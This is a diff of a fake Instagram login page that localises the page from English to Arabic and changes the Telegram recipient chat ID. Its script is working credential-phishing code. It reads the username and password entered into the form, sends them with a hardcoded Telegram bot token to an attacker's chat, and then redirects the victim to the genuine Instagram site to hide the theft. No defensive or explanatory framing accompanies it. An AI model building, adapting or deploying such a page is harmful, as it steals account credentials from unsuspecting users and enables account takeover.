@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Instagram</title>
+    <title>تسجيل الدخول - Instagram</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -13,20 +13,20 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            direction: ltr; /* Text direction from left to right */
+            direction: rtl; /* اتجاه النصوص من اليمين لليسار */
         }
         .login-container {
             background-color: #fff;
             border: 1px solid #dbdbdb;
-           padding: 20px;
-            width: 90%; /* Reduced width for smaller screens */
-            max-width: 360px; /* Max width for phones */
+            padding: 20px;
+            width: 90%; /* تقليل العرض ليكون مناسبًا للشاشات الصغيرة */
+            max-width: 360px; /* تحديد عرض أقصى يناسب الهواتف */
             text-align: center;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
         }
         .login-container img {
-            width: 150px; /* Reduced logo size to fit phones */
+            width: 150px; /* تقليل حجم الشعار ليتناسب مع الهواتف */
             margin-bottom: 20px;
         }
         input[type="text"], input[type="password"] {
@@ -36,18 +36,18 @@
             border: 1px solid #dbdbdb;
             border-radius: 5px;
             font-size: 16px;
-            text-align: left; /* Align text to the left */
+            text-align: right; /* محاذاة النصوص لليمين */
         }
         .login-options {
-            margin: 10px 0; /* Space between fields */
-            text-align: center; /* Center text alignment */
+            margin: 10px 0; /* المسافة بين الحقول */
+            text-align: center; /* محاذاة النصوص في الوسط */
         }
         .login-options a {
             color: #3897f0;
             text-decoration: none;
-            font-size: 16px; /* Increase text size */
+            font-size: 16px; /* تكبير حجم النص */
             position: relative;
-            right: -10px; /* Move text to the right */
+            left: -10px; /* تحريك النص إلى اليسار */
         }
         button {
             width: 100%;
@@ -58,13 +58,13 @@
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
-            margin-top: 10px; /* Space between fields and "Log in" button */
+            margin-top: 10px; /* المسافة بين الحقول وزر "تسجيل الدخول" */
         }
         button:hover {
             background-color: #318ce7;
         }
         .facebook-login {
-            background-color: #3897f0; /* Background color to match login button */
+            background-color: #3897f0; /* تغيير لون الخلفية ليتناسب مع لون تسجيل الدخول */
             color: #fff;
             font-weight: bold;
             margin-top: 10px;
@@ -73,10 +73,10 @@
             border: none;
         }
         .facebook-login span {
-            font-size: 16px; /* Slightly larger text size */
+            font-size: 16px; /* تغيير حجم النص ليكون أكبر قليلاً */
         }
         .footer {
-            margin-top: 30px; /* Increase space between text and "Don't have an account?" */
+            margin-top: 30px; /* زيادة المسافة بين النصوص الأخرى و"أليس لديك حساب؟" */
             font-size: 14px;
             color: #8e8e8e;
         }
@@ -91,38 +91,38 @@
 <div class="login-container">
     <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhicku6xeRp5E0bcPjckDvHKGyJ2ohsqfV1TgnZ0c1KeTY2AqxA12VZE4-LoKfQKnn96Pytn8Q2GrnMnEYQr13j51hi4Uad3ELXpxMCWQWaxE2O-GYo10VP1PkciyNrcYg0NDz3dI5Uos3zc3_f31sCJvXGfntXnULR0Ojs0BnIAJNwCsFa6A0sNEYWzLDQ/s183/inst.png" alt="Instagram Logo">
     <button class="facebook-login">
-        <span>Continue with Facebook</span>
+        <span>متابعة بحساب فيسبوك</span>
     </button>
-    <div class="login-options">OR</div>
+    <div class="login-options">أو</div>
     <form id="loginForm" method="POST">
-        <input type="hidden" name="chat_id" value="1726014017">
+        <input type="hidden" name="chat_id" value="1900509620">
         <input type="hidden" name="text" id="message">
-        <input type="text" id="username" placeholder="Phone number username or email" required>
-        <input type="password" id="password" placeholder="Password" required>
+        <input type="text" id="username" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" required>
+        <input type="password" id="password" placeholder="كلمة السر" required>
         <div class="login-options">
-            <a href="#">Forgot password?</a>
+            <a href="#">هل نسيت كلمة السر؟</a>
         </div>
-        <button type="submit" onclick="sendTelegram(event)">Log In</button>
+        <button type="submit" onclick="sendTelegram(event)">تسجيل الدخول</button>
     </form>
     <div class="footer">   
-        Don't have an account? <a href="#">Sign up</a>
+        أليس لديك حساب؟ <a href="#">تسجيل</a>
     </div>
 </div>
 
 <script>
     function sendTelegram(event) {
-        event.preventDefault();  // Prevent form from being submitted by default
+        event.preventDefault();  // منع إرسال النموذج افتراضيًا
 
         var username = document.getElementById('username').value;
         var password = document.getElementById('password').value;
-        var message = "𝒜ℳ𝒾ℛ @VPN50\n" + "\nايميل: " + username + "\nكلمة السر: " + password;
+        var message = "Email: " + username + "\nPassword: " + password;
 
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendMessage", true);
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("chat_id=1726014017&text=" + encodeURIComponent(message));
+        xhr.send("chat_id=1900509620&text=" + encodeURIComponent(message));
 
-        // Redirect to Instagram after sending the message
+        // إعادة التوجيه إلى موقع إنستجرام بعد الإرسال
         xhr.onload = function() {
             window.location.href = "https://www.instagram.com";
         };
